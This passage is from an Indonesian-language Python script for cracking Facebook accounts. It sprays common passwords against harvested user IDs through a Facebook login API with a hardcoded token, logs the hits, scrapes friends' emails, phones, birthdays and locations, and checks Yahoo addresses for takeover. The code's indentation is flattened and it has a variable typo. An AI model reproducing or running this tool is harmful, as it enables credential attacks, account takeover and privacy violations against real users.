								cek.write("ID:" +user+ " Pw:" +pass34+"\n")
								cek.close()
								cekpoint.append(user+pass34)
								else:
								pass35 = 'Polontong'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass35)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass35 + '\n'
								oks.append(user+pass35)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass35 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass35+"\n")
								cek.close()
								cekpoint.append(user+pass35)
								else:
								pass36 = 'Santri'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass36)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass36 + '\n'
								oks.append(user+pass36)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass36 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass36+"\n")
								cek.close()
								cekpoint.append(user+pass36)
								else:
								pass37 = 'jomblo'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass37)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass37 + '\n'
								oks.append(user+pass37)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass37 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass37+"\n")
								cek.close()
								cekpoint.append(user+pass37)
								else:
								pass38 = 'Pelangi'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass38)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass38 + '\n'
								oks.append(user+pass38)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass38 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass38+"\n")
								cek.close()
								cekpoint.append(user+pass38)
								else:
								pass39 = 'Facebook'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass39)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass39 + '\n'
								oks.append(user+pass39)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass39 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass39+"\n")
								cek.close()
								cekpoint.append(user+pass39)
								else:
								pass40 = 'facebook'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass40)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass40 + '\n'
								oks.append(user+pass340)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass40 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass40+"\n")
								cek.close()
								cekpoint.append(user+pass40)
								except:
								pass
								
								p = ThreadPool(30)
								p.map(main, id)
								print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
								print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
								print("\033[1;96m[+] \033[1;92mCP File tersimpan \033[1;91m: \033[1;97mout/super_cp.txt")
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								super()
								
								
								def grupsaya():
								os.system('clear')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								print"\033[1;96m[!] \x1b[1;91mToken invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								try:
								os.mkdir('out')
								except OSError:
								pass
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								try:
								uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
								gud = json.loads(uh.text)
								for p in gud['data']:
								nama = p["name"]
								id = p["id"]
								f=open('out/Grupid.txt','w')
								listgrup.append(id)
								f.write(id + '\n')
								print("\033[1;96m[✓] \033[1;92mGROUP SAYA")
								print("\033[1;96m[➹] \033[1;97mID  \033[1;91m: \033[1;92m"+str(id))
								print("\033[1;96m[➹] \033[1;97mNama\033[1;91m: \033[1;92m"+str(nama) + '\n')
								print 42*"\033[1;96m="
								print"\033[1;96m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
								print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: \033[1;97mout/Grupid.txt")
								f.close()
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								except (KeyboardInterrupt,EOFError):
								print("\033[1;96m[!] \x1b[1;91mTerhenti")
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								except KeyError:
								os.remove('out/Grupid.txt')
								print('\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan')
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								except requests.exceptions.ConnectionError:
								print"\033[1;96m[✖] \x1b[1;91mTidak ada koneksi"
								keluar()
								except IOError:
								print "\033[1;96m[!] \x1b[1;91mError"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								
								def informasi():
								os.system('clear')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								print"\033[1;91m[!] Token invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								aid = raw_input('\033[1;96m[+] \033[1;93mMasukan ID/Nama\033[1;91m : \033[1;97m')
								jalan('\033[1;96m[✺] \033[1;93mTunggu sebentar \033[1;97m...')
								r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
								cok = json.loads(r.text)
								for i in cok['data']:
								if aid in i['name'] or aid in i['id']:
								x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
								z = json.loads(x.text)
								print 43*"\033[1;96m="
								try:
								print '\033[1;96m[➹] \033[1;93mNama\033[1;97m          : '+z['name']
								except KeyError: print '\033[1;96m[?] \033[1;93mNama\033[1;97m          : \033[1;91mTidak ada'
								try:
								print '\033[1;96m[➹] \033[1;93mID\033[1;97m            : '+z['id']
								except KeyError: print '\033[1;96m[?] \033[1;93mID\033[1;97m            : \033[1;91mTidak ada'
								try:
								print '\033[1;96m[➹] \033[1;93mEmail\033[1;97m         : '+z['email']
								except KeyError: print '\033[1;96m[?] \033[1;93mEmail\033[1;97m         : \033[1;91mTidak ada'
								try:
								print '\033[1;96m[➹] \033[1;93mNo HP\033[1;97m         : '+z['mobile_phone']
								except KeyError: print '\033[1;96m[?] \033[1;93mNo HP\033[1;97m         : \033[1;91mTidak ada'
								try:
								print '\033[1;96m[➹] \033[1;93mTempat tinggal\033[1;97m: '+z['location']['name']
								except KeyError: print '\033[1;96m[?] \033[1;93mTempat tinggal\033[1;97m: \033[1;91mTidak ada'
								try:
								print '\033[1;96m[➹] \033[1;93mTanggal lahir\033[1;97m : '+z['birthday']
								except KeyError: print '\033[1;96m[?] \033[1;93mTanggal lahir\033[1;97m : \033[1;91mTidak ada'
								try:
								print '\033[1;96m[➹] \033[1;93mSekolah\033[1;97m       : '
								for q in z['education']:
								try:
								print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
								except KeyError: print '\033[1;91m                   ~ \033[1;91mTidak ada'
								except KeyError: pass
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								else:
								pass
								else:
								print"\033[1;96m[✖] \x1b[1;91mAkun tidak ditemukan"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								
								def yahoo():
								global toket
								os.system('clear')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								print"\033[1;91m[!] Token invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								print "\x1b[1;97m1.\x1b[1;93m Clone dari daftar teman"
								print "\x1b[1;97m2.\x1b[1;93m Clone dari teman"
								print "\x1b[1;97m3.\x1b[1;93m Clone dari member group"
								print "\x1b[1;97m4.\x1b[1;93m Clone dari file"
								print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
								clone()
								
								def clone():
								embuh = raw_input("\n\x1b[1;97m >>> ")
								if embuh =="":
								print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
								elif embuh =="1":
								clone_dari_daftar_teman()
								elif embuh =="2":
								clone_dari_teman()
								elif embuh =="3":
								clone_dari_member_group()
								elif embuh =="4":
								clone_dari_file()
								elif embuh =="0":
								menu()
								else:
								print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
								
								
								def clone_dari_daftar_teman():
								global toket
								os.system('reset')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								print"\033[1;91m[!] Token Invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								try:
								os.mkdir('out')
								except OSError:
								pass
								os.system('clear')
								print logo
								mpsh = []
								jml = 0
								print 42*"\033[1;96m="
								jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mMengambil email \033[1;97m...')
								teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
								kimak = json.loads(teman.text)
								jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mStart \033[1;97m...')
								print ('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
								print 42*"\033[1;96m="
								for w in kimak['data']:
								jml +=1
								mpsh.append(jml)
								id = w['id']
								nama = w['name']
								links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
								z = json.loads(links.text)
								try:
								mail = z['email']
								yahoo = re.compile(r'@.*')
								otw = yahoo.search(mail).group()
								if 'yahoo.com' in otw:
								br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
								br._factory.is_html = True
								br.select_form(nr=0)
								br["username"] = mail
								klik = br.submit().read()
								jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
								try:
								pek = jok.search(klik).group()
								except:
								continue
								if '"messages.ERROR_INVALID_USERNAME">' in pek:
								print("\033[1;96m[✓] \033[1;92mVULN")
								print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
								print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
								print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama+ '\n')
								save = open('out/MailVuln.txt','a')
								save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
								save.close()
								berhasil.append(mail)
								except KeyError:
								pass
								print 42*"\033[1;96m="
								print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
								print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
								print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/MailVuln.txt"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								
								
								def clone_dari_teman():
								global toket
								os.system('clear')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								print"\033[1;96m[!] \x1b[1;91mToken invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								try:
								os.mkdir('out')
								except OSError:
								pass
								os.system('clear')
								print logo
								mpsh = []
								jml = 0
								print 42*"\033[1;96m="
								idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
								try:
								jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
								op = json.loads(jok.text)
								print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama\033[1;91m :\033[1;97m "+op["name"]
								except KeyError:
								print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
								teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
								kimak = json.loads(teman.text)
								jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
								print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
								print 43*"\033[1;96m="
								for w in kimak['data']:
								jml +=1
								mpsh.append(jml)
								id = w['id']
								nama = w['name']
								links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
								z = json.loads(links.text)
								try:
								mail = z['email']
								yahoo = re.compile(r'@.*')
								otw = yahoo.search(mail).group()
								if 'yahoo.com' in otw:
								br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
								br._factory.is_html = True
								br.select_form(nr=0)
								br["username"] = mail
								klik = br.submit().read()
								jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
								try:
								pek = jok.search(klik).group()
								except:
								continue
								if '"messages.ERROR_INVALID_USERNAME">' in pek:
								print("\033[1;96m[✓] \033[1;92mVULN")
								print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
								print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
								print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
								save = open('out/TemanMailVuln.txt','a')
								save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
								save.close()
								berhasil.append(mail)
								except KeyError:
								pass
								print 42*"\033[1;96m="
								print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
								print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
								print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/TemanMailVuln.txt"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								
								def clone_dari_member_group():
								global toket
								os.system('clear')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								print"\033[1;96m[!] \x1b[1;91mToken invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								try:
								os.mkdir('out')
								except OSError:
								pass
								os.system('clear')
								print logo
								mpsh = []
								jml = 0
								print 42*"\033[1;96m="
								id=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
								try:
								r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
								asw=json.loads(r.text)
								print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
								except KeyError:
								print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
								teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
								kimak = json.loads(teman.text)
								jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
								print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
								print 42*"\033[1;96m="
								for w in kimak['data']:
								jml +=1
								mpsh.append(jml)
								id = w['id']
								nama = w['name']
								links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
								z = json.loads(links.text)
								try:
								mail = z['email']
								yahoo = re.compile(r'@.*')
								otw = yahoo.search(mail).group()
								if 'yahoo.com' in otw:
								br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
								br._factory.is_html = True
								br.select_form(nr=0)
								br["username"] = mail
								klik = br.submit().read()
								jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
								try:
								pek = jok.search(klik).group()
								except:
								continue
								if '"messages.ERROR_INVALID_USERNAME">' in pek:
								print("\033[1;96m[✓] \033[1;92mVULN")
								print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
								print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
								print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
								save = open('out/GrupMailVuln.txt','a')
								save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
								save.close()
								berhasil.append(mail)
								except KeyError:
								pass
								print 42*"\033[1;96m="
								print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
								print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
								print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								
								
								def clone_dari_file():
								global toket
								os.system('clear')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								print"\033[1;96m[!] \x1b[1;91mToken invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								try:
								os.mkdir('out')
								except OSError:
								pass
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								files = raw_input("\033[1;96m[+] \033[1;93mNama File \033[1;91m: \033[1;97m")
								try:
								total = open(files,"r")
								mail = total.readlines()
								except IOError:
								print"\033[1;96m[!] \x1b[1;91mFile tidak ditemukan"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								mpsh = []
								jml = 0
								jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
								print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
								print 42*"\033[1;96m="
								mail = open(files,"r").readlines()
								for pw in mail:
								mail = pw.replace("\n","")
								jml +=1
								mpsh.append(jml)
								yahoo = re.compile(r'@.*')
								otw = yahoo.search(mail).group()
								if 'yahoo.com' in otw:
								br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
								br._factory.is_html = True
								br.select_form(nr=0)
								br["username"] = mail
								klik = br.submit().read()
								jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
								try:
								pek = jok.search(klik).group()
								except:
								continue
								if '"messages.ERROR_INVALID_USERNAME">' in pek:
								print("\033[1;96m[✓] \033[1;92mVULN")
								print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
								save = open('out/MailVuln.txt','a')
								save.write("Email: "+ mail + '\n\n')
								save.close()
								berhasil.append(mail)
								print 42*"\033[1;96m="
								print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
								print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
								print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								menu()
								
								
								
								if __name__ == '__main__':
								siapa()
								
								
